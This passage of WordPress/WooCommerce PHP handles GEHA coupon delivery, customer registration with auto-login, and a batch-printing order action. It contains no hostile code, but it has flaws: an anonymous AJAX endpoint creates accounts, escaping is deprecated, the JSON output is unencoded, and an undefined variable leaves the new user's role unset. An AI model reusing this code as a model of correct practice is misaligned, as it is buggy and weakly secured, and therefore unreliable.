        update_post_meta($new_coupon_id, 'geha_coupon', 'yes');
        register_geha_customer($email, $first_name, $last_name, $member_id);
        /* Send Coupon Code to customer */
        $to = $email;
        $subject = 'Geha Coupon Code for smilebrilliant.com';
        $body = 'Code:' . $coupon_code;
        $headers = array('Content-Type: text/html; charset=UTF-8');
        wp_mail($to, $subject, $body, $headers);
        $arr = array('status' => true, 'code' => $coupon_code);
    } else {
        $arr = array('status' => false, 'code' => 'SomeThing Went Wrong Please Try Again');
    }
    echo json_encode($arr);
    die();
}

function register_geha_customer($email, $first_name = '', $last_name = '', $member_id = '') {
    $user_id = username_exists($email);
    if (!$user_id && false == email_exists($email)) {
        $random_password = wp_generate_password($length = 12, false);
        $user_id = wp_create_user($email, $random_password, $email);
        $user_data = new WP_User($user_id);
        $user_data->remove_role('subscriber'); // Optional, you don't have to remove this role if you want to keep subscriber as well
        $user_data->add_role('customer');
        update_user_meta($user_id, 'geha_user', 'yes');
        update_user_meta($user_id, "billing_email", $email);
        update_user_meta($user_id, "billing_first_name", $first_name);
        update_user_meta($user_id, "billing_last_name", $last_name);
        update_user_meta($user_id, "first_name", $first_name);
        update_user_meta($user_id, "last_name", $last_name);
        update_user_meta($user_id, "geha_member_id", $member_id);
        clean_user_cache($user_id);
        wp_clear_auth_cookie();
        wp_set_current_user($user_id);
        wp_set_auth_cookie($user_id, true, false);
        update_user_caches($user_data);
    }
}

add_filter('bulk_actions-edit-shop_order', function($bulk_actions) {
    $bulk_actions['wc_batch_printing'] = __('Batch Printing', 'txtdomain');
    return $bulk_actions;
});
add_filter('handle_bulk_actions-edit-shop_order', function($redirect_url, $action, $post_ids) {
    if ($action == 'wc_batch_printing') {

        $res = batch_printing_send_request($post_ids);
        //die();
        $redirect_url = add_query_arg('wc_batch_printing', count($post_ids), $redirect_url);
        echo $res;
        echo '<br />';
        echo '<a href="' . get_admin_url() . '/edit.php?post_type=shop_order" class="button" >Go Back</a>';
        die();
    }
    //$bulk_actions['batch-printing'] = __('Batch Printing', 'txtdomain');
    return $redirect_url . '&res=' . $res;
}, 10, 3);

add_action('wp_ajax_create_woo_customer','create_woo_customer');
add_action('wp_ajax_nopriv_create_woo_customer','create_woo_customer');
function create_woo_customer(){
    global $wpdb;
        $cus_first_name = $wpdb->escape($_REQUEST['cus_first_name']);  
        $cus_last_name = $wpdb->escape($_REQUEST['cus_last_name']); 
         $customer_email = $wpdb->escape($_REQUEST['customer_email']); 
        
        $errors = '';
        if(empty($cus_first_name)) 
        {   
            $errors = "Please enter a first name";  
        }
        if(empty($cus_last_name)) 
        {   
            $errors = "Please enter a last name";  
        }
        
   
        // Check email address is present and valid  
        $email = $wpdb->escape($_REQUEST['customer_email']);  
        if( !is_email( $email ) ) 
        {   
            $errors = "Please enter a valid email";  
        } elseif( email_exists( $email ) ) 
        {  
            $errors = "This email address is already in use";  
        }
   
        if($errors=='') 
         {  
   
            $password = wp_generate_password( 8, false );
            $new_user_id = wp_create_user( $email, $password, $email );  
            $user_id_role = new WP_User($user_id);
            $user_id_role->set_role('customer');
            // You could do all manner of other things here like send an email to the user, etc. I leave that to you.  
   
            $success = 1;  
            echo '{"status":"1"}';
        }  
   
    
    else{
        echo '{"status":"0","error":"'.$errors.'"}';
    }
    die();
}
